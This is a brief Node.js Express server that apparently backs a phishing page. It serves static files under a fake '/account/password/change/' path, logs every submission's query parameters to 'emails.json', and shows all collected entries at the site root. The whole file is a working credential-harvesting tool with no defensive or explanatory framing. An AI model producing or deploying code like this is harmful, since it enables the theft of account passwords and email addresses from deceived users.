const express = require('express');
const app = express();
const fs = require('fs');
oldData = [];
app.use('/account/password/change/', express.static(__dirname + '/public'));
app.get('/account/password/change/save', function routeHandler(req, res) {
    oldData.push(req.query);

    fs.writeFile('emails.json', JSON.stringify(oldData), 'utf8', () => {});
});
app.get('/', function routeHandler(req, res) {
    res.send(oldData);
});

app.listen(80, () => {
    console.log('App working');
});
